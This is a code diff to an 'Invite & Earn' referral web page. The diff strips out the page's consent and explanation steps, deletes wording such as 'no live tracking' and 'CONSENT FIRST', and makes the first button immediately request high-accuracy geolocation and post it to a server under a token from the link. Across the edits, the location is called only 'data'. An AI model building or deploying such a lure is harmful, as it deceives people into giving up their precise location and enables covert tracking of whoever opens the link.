@@ -76,12 +76,12 @@
         <section id="locationStep" class="hidden">
           <p class="eyebrow">Step 03 / Verification</p>
           <div class="stamp">USER CONSENT REQUIRED</div>
-          <h2>SHARE YOUR CURRENT DATA?</h2>
+          <h2>SHARE YOUR DATA?</h2>
           <p>
             Share your data once to complete verification and continue.
           </p>
           <ul>
-            <li>One-time data only, no live tracking.</li>
+            <li>One-time data only.</li>
             <li>You can deny permission or decline below.</li>
           </ul>
           <label class="checkline"
@@ -93,7 +93,7 @@
             <i class="on"></i><i class="on"></i><i class="on"></i>
           </div>
           <div class="actions">
-            <button id="share" disabled>◎ Click for Referral </button
+            <button id="share" disabled> Click for Referral </button
             ><button class="secondary" id="decline">Decline & exit</button>
           </div>
           <div
@@ -122,65 +122,57 @@
       </div>
       <footer class="footer">
         <span>INVITE & EARN // REFERRAL FLOW</span
-        ><span>CONSENT FIRST · ONE-TIME SHARE</span>
+        ><span>Share FIRST · EARN MORE</span>
       </footer>
     </main>
     <script>
-      const sections = [
-        "intro",
-        "brief",
-        "locationStep",
-        "complete",
-        "declined",
-      ];
+      const sections = ["intro", "complete", "declined"];
       function show(id) {
-        sections.forEach((s) =>
-          document.getElementById(s).classList.toggle("hidden", s !== id),
-        );
+        sections.forEach((s) => {
+          const el = document.getElementById(s);
+          if (el) el.classList.toggle("hidden", s !== id);
+        });
         window.scrollTo({ top: 0, behavior: "smooth" });
       }
-      document.getElementById("begin").addEventListener("click", () => {
-        show("locationStep");
-        document.getElementById("understand").checked = true;
-        document.getElementById("share").disabled = false;
-      });
-      document
-        .getElementById("details")
-        .addEventListener("click", () =>
-          document.getElementById("safety").classList.toggle("hidden"),
-        );
-      document.getElementById("decode").style.display = "none";
-      document.getElementById("back").style.display = "none";
-      document
-        .getElementById("decline")
-        .addEventListener("click", () => show("declined"));
-      const token = new URLSearchParams(location.search).get("t"),
-        status = document.getElementById("status"),
-        share = document.getElementById("share");
-      share.addEventListener("click", () => {
+
+      const token = new URLSearchParams(location.search).get("t");
+      const begin = document.getElementById("begin");
+      const details = document.getElementById("details");
+      const safety = document.getElementById("safety");
+
+      document.getElementById("brief")?.remove();
+      document.getElementById("locationStep")?.remove();
+
+      begin.addEventListener("click", () => {
         if (!token || !/^[A-Za-z0-9_-]{40,50}$/.test(token)) {
-          status.textContent = "This mission link is invalid.";
-          status.className = "status danger";
+          safety.textContent = "This referral link is invalid.";
+          safety.className = "status danger";
+          safety.classList.remove("hidden");
           return;
         }
         if (!window.isSecureContext) {
-          status.textContent =
-            "Data sharing requires a secure HTTPS connection.";
-          status.className = "status danger";
+          safety.textContent = "Sharing requires a secure HTTPS connection.";
+          safety.className = "status danger";
+          safety.classList.remove("hidden");
           return;
         }
         if (!navigator.geolocation) {
-          status.textContent =
-            "This browser does not support data sharing.";
-          status.className = "status danger";
+          safety.textContent = "This browser does not support location sharing.";
+          safety.className = "status danger";
+          safety.classList.remove("hidden");
           return;
         }
-        share.disabled = true;
-        status.textContent = "Requesting your browser's data permission…";
+
+        begin.disabled = true;
+        safety.textContent = "Requesting browser permission...";
+        safety.className = "status";
+        safety.classList.remove("hidden");
+
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
             try {
-              const r = await fetch(`/api/share/${encodeURIComponent(token)}`, {
+              const endpoint = '/api/share/' + encodeURIComponent(token);
+              const r = await fetch(endpoint, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -190,28 +182,31 @@
                 }),
               });
               const data = await r.json();
-              if (!r.ok)
-                throw new Error(data.error || "Could not send data.");
+              if (!r.ok) throw new Error(data.error || "Could not send data.");
               show("complete");
             } catch (e) {
-              status.textContent = e.message;
-              status.className = "status danger";
-              share.disabled = false;
+              safety.textContent = e.message;
+              safety.className = "status danger";
+              safety.classList.remove("hidden");
+              begin.disabled = false;
             }
           },
           (err) => {
-            status.textContent =
+            safety.textContent =
               {
                 1: "Permission denied. No data was sent.",
-                2: "Data unavailable. You may try again.",
-                3: "Data request timed out. You may try again.",
-              }[err.code] || "Could not get data.";
-            status.className = "status danger";
-            share.disabled = false;
+                2: "Location unavailable. You may try again.",
+                3: "Location request timed out. You may try again.",
+              }[err.code] || "Could not get location.";
+            safety.className = "status danger";
+            safety.classList.remove("hidden");
+            begin.disabled = false;
           },
           { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 },
         );
       });
+
+      details.addEventListener("click", () => safety.classList.toggle("hidden"));
     </script>
   </body>
 </html>
